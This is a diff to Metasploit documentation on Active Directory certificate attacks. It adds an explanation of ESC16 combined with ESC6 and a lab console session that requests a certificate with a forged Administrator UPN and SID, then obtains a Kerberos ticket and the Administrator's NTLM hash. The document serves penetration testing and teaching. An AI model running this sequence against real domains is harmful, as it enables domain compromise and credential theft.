@@ -1532,21 +1532,60 @@ msf6 auxiliary(admin/kerberos/get_ticket) > get_hash rhosts=172.16.199.200 cert_
 If domain controllers are in Full Enforcement mode (`StrongCertificateBindingEnforcement` == 2), ESC16 alone would normally
 prevent authentication using certificates that lack the required SID extension. However, if the CA is also vulnerable
 to ESC6, which is defined as: `EDITF_ATTRIBUTESUBJECTALTNAME2` flag is set under it's `EditFlags` registry key, located here:
-`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA-Name>\PolicyModules\<PolicyModuleName>\` 
-
+`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA-Name>\PolicyModules\<PolicyModuleName>\`
 then the CA accepts arbitrary SAN values from certificate request attribute and an attacker can still bypass strong
 certificate mapping.
 
 In this case, the attacker requests a certificate from the ESC16-affected CA using any client authentication template
 (like "User"), which ensures the SID security extension is omitted. At the same time, they exploit the ESC6 weakness to
 inject a custom Subject Alternative Name that includes both a forged UPN and a specially crafted SID value using the format:
-`URI:tag:microsoft.com,2022-09-14:sid:<SID>`.
+`URI:tag:microsoft.com,2022-09-14:sid:<SID>`. This format was introduced in the May 2022 KB5014754 update and
+intended to help support strong certificate mappings between the user SID and the certificate.
 
 Because the certificate lacks the official SID extension (due to ESC16) but includes a valid-looking SAN SID URI
 (via ESC6), the domain controller accepts it and maps the certificate using the supplied SID—even in Full Enforcement mode.
 
 The way you would exploit ESC16 Scenario 2 with Metasploit is different than Scenario 1 as we don't need to update
 any LDAP objects, and so we can use the `icpr_cert` module to request a certificate. 
+```
+msf6 auxiliary(admin/dcerpc/icpr_cert) >  set alt_sid S-1-5-21-1655260159-4293876351-2321352318-500
+alt_sid => S-1-5-21-1655260159-4293876351-2321352318-500
+msf6 auxiliary(admin/dcerpc/icpr_cert) >  set alt_upn Administrator@msf.local
+alt_upn => Administrator@msf.local
+msf6 auxiliary(admin/dcerpc/icpr_cert) >  set ca msf-DC3-CA
+ca => msf-DC3-CA
+msf6 auxiliary(admin/dcerpc/icpr_cert) >  set cert_template User
+cert_template => User
+msf6 auxiliary(admin/dcerpc/icpr_cert) >  set RHOSTS 172.16.199.130
+RHOSTS => 172.16.199.130
+msf6 auxiliary(admin/dcerpc/icpr_cert) >  set smbdomain msf.local
+smbdomain => msf.local
+msf6 auxiliary(admin/dcerpc/icpr_cert) >  set smbpass N0tpassword!
+smbpass => N0tpassword!
+msf6 auxiliary(admin/dcerpc/icpr_cert) >  set smbuser user1
+smbuser => user1
+msf6 auxiliary(admin/dcerpc/icpr_cert) > run
+[*] Running module against 172.16.199.130
+[+] 172.16.199.130:445 - The requested certificate was issued.
+[*] 172.16.199.130:445 - Certificate Policies:
+[*] 172.16.199.130:445 - Certificate UPN: Administrator@msf.local
+[*] 172.16.199.130:445 - Certificate URI: tag:microsoft.com,2022-09-14:sid:S-1-5-21-1655260159-4293876351-2321352318-500
+[*] 172.16.199.130:445 - Certificate stored at: /Users/jheysel/.msf4/loot/20250605113503_default_172.16.199.130_windows.ad.cs_258878.pfx
+[*] Auxiliary module execution completed
+
+
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > use admin/kerberos/get_ticket
+[*] Using action GET_TGT - view all 3 actions with the show actions command
+msf6 auxiliary(admin/kerberos/get_ticket) > get_hash rhost=172.16.199.130 cert_file=/Users/jheysel/.msf4/loot/20250605113503_default_172.16.199.130_windows.ad.cs_258878.pfx
+[*] Running module against 172.16.199.130
+[+] 172.16.199.130:88 - Received a valid TGT-Response
+[*] 172.16.199.130:88 - TGT MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250605114022_default_172.16.199.130_mit.kerberos.cca_939850.bin
+[*] 172.16.199.130:88 - Getting NTLM hash for Administrator@msf.local
+[+] 172.16.199.130:88 - Received a valid TGS-Response
+[*] 172.16.199.130:88 - TGS MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250605114022_default_172.16.199.130_mit.kerberos.cca_483040.bin
+[+] Found NTLM hash for Administrator: aad3b435b51404eeaad3b435b51404ee:4fd408d8f8ecb20d4b0768a0ac44b71f
+[*] Auxiliary module execution completed
+```
 
 # Authenticating With A Certificate
 Metasploit supports authenticating with certificates in a couple of different ways. These techniques can be used to take
